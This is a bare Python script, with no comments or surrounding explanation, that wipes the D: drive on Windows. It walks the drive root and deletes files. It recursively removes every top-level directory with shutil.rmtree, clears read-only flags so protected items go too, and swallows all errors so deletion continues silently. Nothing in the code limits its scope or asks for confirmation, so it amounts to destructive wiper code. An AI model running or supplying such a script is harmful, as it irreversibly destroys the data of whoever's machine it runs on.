import os, stat
import shutil

def remove_readonly(func, path, _):
    os.chmod(path, stat.S_IWRITE)
    func(path)
os.chdir('D:\\')
for root, dirs, files in os.walk('D:\\'):
    for f in files:
        try:
            os.remove(f"{f}")
        except:
            pass
    for d in dirs:
        try:
            shutil.rmtree(f"D:\\{d}", onerror=remove_readonly)
        except:
            pass
